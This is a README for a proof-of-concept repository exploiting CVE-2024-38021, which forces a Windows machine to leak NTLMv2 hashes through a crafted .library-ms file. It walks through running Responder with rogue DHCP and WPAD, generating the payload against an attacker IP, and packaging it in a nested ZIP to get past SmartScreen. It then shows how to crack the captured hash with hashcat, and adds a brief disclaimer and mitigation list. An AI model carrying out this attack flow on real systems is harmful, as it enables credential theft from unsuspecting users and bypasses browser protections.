# CVE-2024-38021 - Windows Library NTLM Hash Theft PoC

Check the official exploit here: [Exploit-DB 52480](https://www.exploit-db.com/exploits/52480)

## 📌 Overview

This repository contains a functional Proof of Concept (PoC) for **CVE-2024-38021** (related to EDB-ID 52480). 
This vulnerability allows an attacker to force a Windows system to initiate an outbound NTLM authentication by simply interacting with a crafted `.library-ms` file.

The goal of this project is to demonstrate how "Forced Authentication" attacks work and how they can lead to credential theft (NTLMv2 hashes) via the SMB protocol.

This exploit has been patched since July 09, 2024: [patch note here](https://learn.microsoft.com/en-us/officeupdates/microsoft365-apps-security-updates)

## ⚠️ Disclaimer

**For educational and ethical purposes only.** 
This tool is intended for security researchers and authorized penetration testers. 
Never use it on systems you do not own or have explicit permission to test. 
The author is not responsible for any misuse.


## 🛠️ Lab Setup

To reproduce this exploit, you need two machines on the same network:

1. **Attacker (Linux):** IP `10.10.6.46` (Running Responder)
2. **Victim (Windows 10):** IP `10.10.6.177` (Vulnerable version < July 2024)


## 🛠️ Attacker Setup: Responder

**Responder** is a [LLMNR](https://fr.wikipedia.org/wiki/Link-local_Multicast_Name_Resolution) (Link-Local Multicast Name Resolution), [NBT-NS](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP), and [MDNS](https://en.wikipedia.org/wiki/Multicast_DNS) poisoner. 
It is used here to emulate a rogue SMB server that will capture the victim's [NTLMv2](https://en.wikipedia.org/wiki/NTLM) hashes.

### 1. Installation

If you don't have Responder installed on your Linux, follow these steps:

```bash
git clone [https://github.com/lgandx/Responder.git](https://github.com/lgandx/Responder.git)
cd Responder
sudo apt install python3-pip
pip3 install -r requirements.txt
```

### 2. Execution of the Listener

To capture the NTLM hash, start Responder on your network interface (replace eth0 with your actual interface, find it using ip a):

```bash
sudo python3 Responder.py -I eth0 -dwv
```

### 🚩 Flags Explained

* **`-I`**: **Interface** – Specifies the network interface to listen on (e.g., `eth0`, `wlan0`).
* **`-d`**: **DHCP** – Enables a rogue DHCP server to force clients to register and interact with the attacker.
* **`-w`**: **WPAD** – Starts the rogue WPAD proxy server to catch additional web-based authentication attempts.
* **`-v`**: **Verbose** – **Crucial** for seeing the captured NTLMv2 hashes directly in the terminal in real-time.

### 🚀 Payload Generation & Weaponization

The Python script malicious_generator.py handles the creation of the exploit and its packaging to evade basic security.

## 1. Run the Generator

```bash
python3 malicious_generator.py 10.10.6.46 My_Project_Files
```

## 2. How it works (The ZIP Strategy)

During my testing, I  observed that direct downloads of the ".library-ms" files are often flagged by browsers (SmartScreen).

To bypass this and increase credibility:

1. The script crates a nested folder
2. It places the ".library-ms" file inside this folder.
3. It compresses everything into a ZIP archive.

### ⚡ Step-by-Step Attack Flow

1. Terminal 1 (Responder): Start the listener.
2. Terminal 2 (Payload): Run the generator script.
3. Victim Action: The victim downloads the ZIP, extracts it, and simply opens the folder.
4. The Leak: As soon as Windows Explorer tries to render the icon for the file, it initiates an SMB connection to the attacker, leaking the NTLMv2 hash in the Responder terminal

### 🔑 Post-Exploitation: Cracking the Hash

Once the hash is captured (User::Domain:Challenge:Hash...), you can use Hashcat to recover the password:

```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

###  🛡️ Mitigation

1. Update Windows: Install the July 2024 security patches.
2. Block Port 445: Block outbound SMB traffic at the firewall level.
3. SMB Signing: Enforce SMB signing to prevent relay attacks.
